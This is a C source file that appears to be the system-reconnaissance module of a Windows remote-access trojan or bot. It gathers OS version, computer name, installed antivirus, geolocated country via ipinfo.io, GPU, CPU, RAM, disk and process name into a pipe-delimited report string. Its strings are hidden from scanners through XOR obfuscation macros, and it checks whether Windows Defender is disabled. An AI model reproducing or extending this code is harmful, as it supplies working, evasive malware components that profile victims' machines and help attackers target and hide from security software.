#include "sysinfo.h"
#include "utils.h"
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <psapi.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "psapi.lib")

static char* reg_read_sz(HKEY key, const char* subkey, const char* value) {
    HKEY hKey;
    if (RegOpenKeyExA(key, subkey, 0, KEY_READ, &hKey) != ERROR_SUCCESS) return NULL;
    DWORD size = 0;
    if (RegQueryValueExA(hKey, value, NULL, NULL, NULL, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return NULL;
    }
    char* buf = (char*)malloc(size);
    if (RegQueryValueExA(hKey, value, NULL, NULL, (LPBYTE)buf, &size) != ERROR_SUCCESS) {
        free(buf);
        RegCloseKey(hKey);
        return NULL;
    }
    RegCloseKey(hKey);
    return buf;
}

static char* get_win_version() {
    const char* key = _S("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion");
    char* product = reg_read_sz(HKEY_LOCAL_MACHINE, key, _S("ProductName"));
    char* build   = reg_read_sz(HKEY_LOCAL_MACHINE, key, _S("CurrentBuild"));
    char* display = reg_read_sz(HKEY_LOCAL_MACHINE, key, _S("DisplayVersion"));
    if (!display) display = reg_read_sz(HKEY_LOCAL_MACHINE, key, _S("ReleaseId"));

    char* result = (char*)malloc(256);
    sprintf(result, _S("%s %s (Build %s)"),
        product ? product : _S("Windows"),
        display ? display : "",
        build   ? build   : "");
    if (product) free(product);
    if (build)   free(build);
    if (display) free(display);
    return result;
}

static char* get_antivirus() {
    const char* av_paths[][2] = {
        {XOR_MARKER "\x00" "SOFTWARE\\AVAST Software\\Avast",  XOR_MARKER "\x00" "Avast"},
        {XOR_MARKER "\x00" "SOFTWARE\\AVG\\Antivirus",          XOR_MARKER "\x00" "AVG"},
        {XOR_MARKER "\x00" "SOFTWARE\\Bitdefender",             XOR_MARKER "\x00" "Bitdefender"},
        {XOR_MARKER "\x00" "SOFTWARE\\KasperskyLab",            XOR_MARKER "\x00" "Kaspersky"},
        {XOR_MARKER "\x00" "SOFTWARE\\McAfee",                  XOR_MARKER "\x00" "McAfee"},
        {XOR_MARKER "\x00" "SOFTWARE\\Norton",                  XOR_MARKER "\x00" "Norton"},
        {XOR_MARKER "\x00" "SOFTWARE\\ESET",                    XOR_MARKER "\x00" "ESET"},
        {XOR_MARKER "\x00" "SOFTWARE\\Trend Micro",             XOR_MARKER "\x00" "Trend Micro"},
        {XOR_MARKER "\x00" "SOFTWARE\\Malwarebytes",            XOR_MARKER "\x00" "Malwarebytes"},
        {NULL, NULL}
    };
    for (int i = 0; av_paths[i][0] != NULL; i++) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, xor_str((char*)av_paths[i][0]), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return _strdup(xor_str((char*)av_paths[i][1]));
        }
    }
    char* disabled = reg_read_sz(HKEY_LOCAL_MACHINE,
        _S("SOFTWARE\\Microsoft\\Windows Defender"), _S("DisableAntiSpyware"));
    if (disabled && strcmp(disabled, _S("1")) == 0) { free(disabled); return _strdup(_S("Unknown")); }
    if (disabled) free(disabled);
    return _strdup(_S("Windows Defender"));
}

static char* get_country() {
    HINTERNET hSession = WinHttpOpen(_W("client/1.0"),
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return _strdup(_S("??"));
    HINTERNET hConnect = WinHttpConnect(hSession, _W("ipinfo.io"), INTERNET_DEFAULT_HTTP_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return _strdup(_S("??")); }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, _W("GET"), _W("/country"), NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return _strdup(_S("??")); }

    if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                           WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
        WinHttpReceiveResponse(hRequest, NULL)) {
        DWORD size = 0;
        WinHttpQueryDataAvailable(hRequest, &size);
        if (size > 0) {
            char* buf = (char*)malloc(size + 1);
            DWORD read = 0;
            WinHttpReadData(hRequest, buf, size, &read);
            buf[read] = 0;
            char* p = buf + strlen(buf) - 1;
            while (p >= buf && (*p == '\r' || *p == '\n' || *p == ' ')) *p-- = 0;
            WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
            return buf;
        }
    }
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return _strdup(_S("??"));
}

static char* get_gpu() {
    char* gpu = reg_read_sz(HKEY_LOCAL_MACHINE,
        _S("SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0000"),
        _S("DriverDesc"));
    if (!gpu) gpu = reg_read_sz(HKEY_LOCAL_MACHINE,
        _S("SYSTEM\\CurrentControlSet\\Control\\Class\\{4d36e968-e325-11ce-bfc1-08002be10318}\\0001"),
        _S("DriverDesc"));
    return gpu ? gpu : _strdup(_S("Unknown GPU"));
}

static char* get_cpu() {
    char* cpu = reg_read_sz(HKEY_LOCAL_MACHINE,
        _S("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0"),
        _S("ProcessorNameString"));
    if (cpu) {
        char* p = cpu;
        while (*p == ' ') p++;
        char* trim = _strdup(p);
        free(cpu);
        return trim;
    }
    return _strdup(_S("Unknown CPU"));
}

static char* get_ram() {
    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    ULONGLONG totalMB = ms.ullTotalPhys  / (1024ULL * 1024ULL);
    ULONGLONG freeMB  = ms.ullAvailPhys  / (1024ULL * 1024ULL);
    char* buf = (char*)malloc(64);
    if (totalMB >= 1024)
        sprintf(buf, _S("%.1f GB free / %.1f GB total"),
            (double)freeMB / 1024.0, (double)totalMB / 1024.0);
    else
        sprintf(buf, _S("%llu MB free / %llu MB total"), freeMB, totalMB);
    return buf;
}

static char* get_disk() {
    ULARGE_INTEGER freeBytesAvail, totalBytes, totalFreeBytes;
    if (!GetDiskFreeSpaceExA(_S("C:\\"), &freeBytesAvail, &totalBytes, &totalFreeBytes))
        return _strdup(_S("Unknown"));
    double totalGB = (double)totalBytes.QuadPart      / (1024.0 * 1024.0 * 1024.0);
    double freeGB  = (double)totalFreeBytes.QuadPart  / (1024.0 * 1024.0 * 1024.0);
    char* buf = (char*)malloc(64);
    sprintf(buf, _S("%.1f GB free / %.1f GB total"), freeGB, totalGB);
    return buf;
}

static char* get_process_name() {
    char path[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, path, MAX_PATH);
    char* last = strrchr(path, '\\');
    return _strdup(last ? last + 1 : path);
}

/* Protocol: WinVersion|DesktopName|AntiVirus|Country|GPU|CPU|RAM|Disk|ProcessName */
char* collect_sysinfo() {
    char* win     = get_win_version();
    char  computer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD csize   = sizeof(computer);
    GetComputerNameA(computer, &csize);
    char* av      = get_antivirus();
    char* country = get_country();
    char* gpu     = get_gpu();
    char* cpu     = get_cpu();
    char* ram     = get_ram();
    char* disk    = get_disk();
    char* proc    = get_process_name();

    size_t len = strlen(win) + strlen(computer) + strlen(av) + strlen(country)
               + strlen(gpu) + strlen(cpu) + strlen(ram) + strlen(disk) + strlen(proc) + 16;
    char* res = (char*)malloc(len);
    sprintf(res, _S("%s|%s|%s|%s|%s|%s|%s|%s|%s"),
        win, computer, av, country, gpu, cpu, ram, disk, proc);

    free(win); free(av); free(country);
    free(gpu); free(cpu); free(ram); free(disk); free(proc);
    return res;
}
